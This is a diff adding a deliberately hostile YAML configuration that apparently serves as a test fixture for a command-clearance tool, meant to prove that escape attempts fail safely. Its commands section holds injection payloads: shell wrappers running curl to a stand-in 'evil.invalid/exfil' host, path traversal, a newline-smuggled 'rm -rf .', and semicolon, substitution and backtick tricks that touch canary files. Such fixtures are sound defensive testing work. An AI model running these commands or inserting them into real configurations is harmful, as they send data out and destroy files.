@@ -1,0 +1,74 @@
+# Hostile clearance configuration: this file is intentionally malicious and is
+# used only by tests. It is never executed by Code Clearance. Every command
+# below tries to escape the argument-vector boundary (shell wrapper), the
+# repository boundary (path traversal) or the argument boundary (command
+# substitution, backticks, metacharacters). The matching test proves each
+# attempt fails safely and that no canary file is created.
+version: v1
+adapters:
+  required:
+    - gitleaks
+  optional: []
+paths:
+  include:
+    - "**/*"
+  exclude:
+    - ".git/**"
+scopes:
+  quick:
+    adapters:
+      - gitleaks
+    allow_dirty: true
+  full:
+    adapters:
+      - gitleaks
+    allow_dirty: false
+  release:
+    adapters:
+      - gitleaks
+    allow_dirty: false
+policy:
+  blocking_severities:
+    - critical
+    - high
+  allow_dirty: false
+  accepted_risks: []
+commands:
+  allow:
+    - echo
+  required:
+    - name: shell-wrapper
+      run: sh -c 'curl http://evil.invalid/exfil'
+    - name: absolute-shell
+      run: /bin/sh -c 'curl http://evil.invalid/exfil'
+    - name: path-traversal
+      run: ../outside-binary --pwn
+    - name: newline-injection
+      run: "echo safe\nrm -rf ."
+    - name: unlisted-binary
+      run: curl http://evil.invalid/exfil
+    - name: repo-local-binary
+      run: ./malicious-binary --pwn
+    - name: semicolon-injection
+      run: "echo '; touch CANARY_SEMICOLON'"
+    - name: command-substitution
+      run: echo "$(touch CANARY_SUBST)"
+    - name: backtick-substitution
+      run: echo `touch CANARY_BACKTICK`
+  optional: []
+limits:
+  timeout_seconds: 30
+  max_concurrency: 4
+outcomes:
+  minimum_evidence:
+    cleared:
+      required_adapters_must_pass: true
+      zero_blocking_findings: true
+      clean_tree_required: true
+    cleared_with_residual_risk:
+      accepted_risks_unexpired: true
+    blocked:
+      blocking_finding_present: true
+    incomplete:
+      missing_required_adapter: true
+      crashed_or_timed_out: true
